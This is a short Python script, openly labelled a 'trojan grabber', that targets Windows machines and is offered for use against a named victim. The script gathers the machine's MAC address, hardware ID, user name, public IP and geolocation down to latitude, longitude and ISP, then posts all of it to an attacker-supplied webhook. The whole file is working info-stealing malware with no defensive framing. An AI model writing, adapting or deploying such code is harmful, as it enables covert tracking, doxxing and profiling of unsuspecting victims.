import os.path
import re, uuid, requests, socket, subprocess, time
import sys
from datetime import datetime

if os.name != "nt":
    sys.exit()

"""
                              ::                     .                                    
                              ~Y:^^::!!J^~??!~^. .^~J.                                    
                         :~:7YPGGGBBBB#BBBBBB#BGY5##B?:~:.                                
                      .~?GBY7^.   ..JB~....^B7...:.:~YG#BBPJ~:                            
                    ^!YBBY.         .^     :^     ..  .:7Y5G#BG7.                         
                   .^J?^.  ::          ..        .!.^.     .!PB#B?^:...                   
                 :55!.  :. ^?.         ::       .^.J!   ::   :::!YBBB!                    
                ~BG.    ~J7.?P.        ?^     .^~!G~  ~?^ .^^.   .YBBBG?~.                
              .YB?.     ^~YY:GG:      .B?    ^G?Y#?.!Y!.~5J:    .^:..7PBB?                
             ^B#G        ::G55BB^     JBBG!.7GBGBBGP~^7GJ.      .:.   :PBBGG?^.           
            ^BG~J:   ::   .5BBBBB?^:^JBBBBBBBBBBBBBG5BP:    .^?J!. .7PBBP7:.              
           .GB~       ^~:.!GBBBBBBBBBBG5JPBBBGBBBBBBBBG?^^7YGP~..!5BB5!.                  
           ~#G.       .JBBBBBBBBBBBBB7   .GBG.:^.:^7PBGBB##BY?JGB#Y~.                     
           ?P.^        ?BBBBBGPY:?BBBG:  :BBG       .. ..~5BBB5.^?Y.                      
           P?          PBBBBBB7.  ^5BBBJYGBBBPY!.          ^J:.   .:                      
          .G.         !BB57!!JGGG7~5BBBBPY7~~!7YBGY!. .^:.                                
          .G:      ..5BBY      7BB##BGY?~:.    ^7?J557?PB7                                
           Y.     .GBBB~      ^GBG7~^:             ~YBBGGG.                               
           ~!      7BBP      7BBB^     ..::.     :YBG?: .JG:                              
            !.     :BB?     7#BG:   ^5Y??J5G5!.!5P?..    ^BG.                             
             .     .PB7 .   PBB^  :5?:     :Y#B5: .:?:    ^B!                             
                   :7BBP:  .BBB~  P!         JBPYYJGBG^   .PG                             
                .!^^?GBB:  .BBB^  .          JBBGJ5PGBBGY!7GB.                            
                 .^~~JBBP.  JBBG^  .      .7GBBBG~^...:~JBGBB:                            
                  .:7YPBBG^  PBBG7  :~YY~!YGY7PBBB#BPY!~~:5BB:                            
                      75PBB~ .PB5:^.  ^BBB! .^.7~.~~PPB#B?.P#J                            
                       :~PBG. .GBJ    :BBBG:        : .GB! .GG                            
                         ~JB?  ~BBJ   .BY:GB~.        .PB5  G#:                           
                         ^YBG  ^BB#^ .5#5 .5#P.        JBB! ~Y5.                          
                         .GB5  7BB7.!BB!.   5#?~!.   :. 5BB:  .:                          
                        :7BB5 .BBP. ?#P      75PBBJ.?:~!:BBP                              
                        ~GBB: 5#J!JYY?^         .^?PB5:5?~GB?                             
                        :GB~:PBPY?~.                .~JPBYPBG.                            
                      .?BJ.^7^.                         .^?5B^                            
                     7B5:                                   ..                            
                   :PP~                                                                   
                .:!J~         TROJAN GRABBER BY TEKKY                                 
"""



dcusername = "VICTIM_NAME"
webh = "ENTER_WEBHOOK"


#-------------------* info *-------------------#
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
pcname = os.path.expanduser("~")[9:]
ip = requests.get('https://api.ipify.org/').text
data = requests.get(f"http://ip-api.com/json/{ip}").json()


#-------------------* hook *-------------------#
requests.post(webh, json={
      "content": "None",
      "embeds": [
            {
                "title": f"{dcusername} | IP: {ip}",
                "description": f"**Location**"
                               f"```python"
                               f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}"
                               f"Lat: {data['lat']} | Lon: {data['lon']} \nISP: {data['isp']}"
                               f"ORG: {data['org']}"
                               f"AS: {data['as']}"
                               f"MAC: {mac}"
                               f"HWID: {hwid}"
                               f"PC-USER: {pcname}```"
                               f"**Time Started:** "
                               f"```python"
                               f"{datetime.now().strftime('%H:%M:%S')}\n```",
                "color": 5814783,
                "footer": {
                    "text": "IP GRABBER BY Whaxor#9999 | Skid Proof",
                    "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
                },
                "timestamp": str(datetime.utcnow())
            }
      ]

    }
)
